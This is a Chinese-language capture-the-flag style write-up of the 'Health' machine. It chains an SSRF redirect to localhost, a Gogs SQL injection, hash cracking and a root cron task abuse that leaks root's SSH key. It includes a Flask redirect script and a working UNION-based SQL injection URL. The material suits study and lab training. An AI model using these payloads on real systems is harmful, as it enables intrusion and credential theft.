# Health

Health 是一台中型 Linux 计算机，在主网页上存在 SSRF 漏洞，可利用该漏洞访问仅在 localhost 上可用的服务。更具体地说，Gogs 实例只能通过 localhost 访问，并且此特定版本容易受到 SQL 注入攻击。由于攻击者可以与 Gogs 实例交互的方式，在这种情况下，最好的方法是通过在本地计算机上安装相同的 Gogs 版本，然后使用自动化工具生成有效的有效负载来复制远程环境。在检索用户“susanne”的哈希密码后，攻击者能够破解哈希并泄露该用户的纯文本密码。可以使用相同的凭据通过 SSH 向远程计算机进行身份验证。权限提升依赖于在用户“root”下运行的 cron 作业。这些 cron 作业与主 Web 应用程序的功能相关，并处理数据库中未经筛选的数据。因此，攻击者能够在数据库中注入恶意任务并泄露用户“root”的 SSH 密钥文件，从而允许他在远程计算机上获得 root 会话。

---

## 外部信息收集

### 端口扫描

循例nmap

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/d00fd879-a641-725a-19e9-91647d4c5f4a.png)

### Web枚举

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/08aa96e3-ab8c-b041-6810-73de7f9a9fc8.png)

看起来就觉得可能存在SSRF，扫一下vhost

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/90da3f6c-e6b5-da4d-e5fa-7bf85332daef.png)

还有过滤

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/4ca97b46-55ff-0847-9ca0-5414e4b12bdb.png)

test

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/a32f1970-8ba9-ba16-b1eb-457f7ce17cfd.png)

监听url会有一个get请求，当我断开nc之后，payload url又来了一个post

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/84e90bb5-5f39-93d6-ef68-296338b270a0.png)

本地起个http server，当监听url访问过来的时候重定向到localhost

```python3
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/')
def index():
    return redirect('http://127.0.0.1')

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8001)
```

这里一定要是always，否则payload url可能收不到post请求

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/3e9670b4-11d7-a8c3-18e2-8364d4f094b4.png)

可以看到响应，说明重定向成功了

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/7a6083d1-1726-6bc0-ec66-128b62d984fe.png)

接下来就可以爆破端口，找到内网的服务，为了方便直接wp跳过这些无聊的环节

3000端口有一个gogs

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/13eaf4a0-0320-6310-0ba4-fe17984ccb0c.png)

## Foothold

谷歌能找到该版本似乎存在sql injection

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/0db5f581-1799-eedb-4654-be4ef9dc531c.png)

poc:

	http://127.0.0.1:3000/api/v1/users/search?q=')%09union%09all%09select%091,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27%09--%09-

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/fd7d7fe6-09ef-a6aa-bc27-d4420f32dce9.png)

查数据

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/f36a145c-467a-c899-e3e6-8ea111786628.png)

得到susanne的密码hash

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/f7573df6-0901-8495-a657-ccdd2b3ff155.png)

在谷歌中能搜到gogs使用PBKDF2 + hmac + sha256

	https://github.com/kxcode/KrackerGo/tree/master


[这里](https://github.com/hashcat/hashcat/issues/1583)也描述了如何利用它

将16进制转回去如何base64

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/1af6407e-6593-c1e2-fc9e-6cb79b7fd354.png)

将salt base64

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/000b0a45-3bab-f675-548e-5727046c1049.png)

hashcat

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/47c21399-b3e4-204b-23a6-a4765093c161.png)

不出意外我们能够通过这种凭据登录ssh

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/4f102eea-1db1-d36f-743b-33dd5e346ea7.png)

## 本地权限提升

传个pspy

```shell
2024/01/17 15:29:01 CMD: UID=0     PID=4350   | /bin/bash -c cd /var/www/html && php artisan schedule:run >> /dev/null 2>&1 
2024/01/17 15:29:01 CMD: UID=0     PID=4351   | sleep 5 
2024/01/17 15:29:01 CMD: UID=???   PID=4354   | ???
2024/01/17 15:29:01 CMD: UID=0     PID=4352   | 
2024/01/17 15:29:01 CMD: UID=0     PID=4357   | grep columns 
2024/01/17 15:29:01 CMD: UID=???   PID=4356   | ???
2024/01/17 15:29:01 CMD: UID=0     PID=4355   | sh -c stty -a | grep columns 
2024/01/17 15:29:06 CMD: UID=0     PID=4358   | mysql laravel --execute TRUNCATE tasks 
```

从artisan跟到app/Console/Kernel.php

```php
protected function schedule(Schedule $schedule)
    {

        /* Get all tasks from the database */
        $tasks = Task::all();

        foreach ($tasks as $task) {

            $frequency = $task->frequency;

            $schedule->call(function () use ($task) {
                /*  Run your task here */
                HealthChecker::check($task->webhookUrl, $task->monitoredUrl, $task->onlyError);
                Log::info($task->id . ' ' . \Carbon\Carbon::now());
            })->cron($frequency);
```

同时，在网站根目录下的.env文件中也包含了mysql的凭据

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/b8b740fb-c309-960e-8bf1-32f7c887ad57.png)

进到mysql后有个tasks空表，desc

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/0307d6bf-0768-622f-7d83-68123c6bc223.png)

应该就是之前的web，直接读root ssh key然后返回到我们的payload url

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/bb1c542f-43f1-513d-e75b-800092631442.png)

nc

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/e81a1006-46aa-9140-d775-a7c3514b487a.png)

sed将\n转义和去除多余的\

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/d0ff3842-3955-39a4-34ef-87cafd4a237c.png)

登root的ssh

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/51d6c199-077f-c3c8-cff9-831bd66e487d.png)

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/898a9f60-2143-2438-f04f-a11ac5264fa3.png)

其实也可以直接在tasks里读root flag
